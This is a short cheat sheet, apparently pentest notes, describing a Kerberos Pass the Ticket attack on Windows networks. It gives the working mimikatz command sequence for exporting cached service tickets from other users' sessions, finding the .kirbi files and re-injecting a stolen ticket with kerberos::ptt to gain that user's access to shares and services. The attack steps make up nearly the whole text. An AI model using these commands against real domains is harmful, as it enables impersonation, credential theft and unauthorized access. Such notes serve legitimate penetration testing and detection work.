The Pass the Ticket attack takes advantage of the TGS, which may be exported and re-injected elsewhere on the network and then used to authenticate to a specific service. In addition, if the service tickets belong to the current user, then no administrative privileges are required.

# mimikatz
```
privilege::debug
```
Assuming a session with a different user already exists on this machine:
```
sekurlsa::tickets /export
```
Look for a file that has $(USER)@$(HOSTNAME).kirbi (i.e. "[0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi"):
```batch
dir *.kirbi
```
```batch
kerberos::ptt $(KIRBI_FILENAME)
```
Now there will be the permissions of the ticket enabled on the current session and user. (i.e. if the user who's ticket was taken from cache is able to access a share, you can too!)
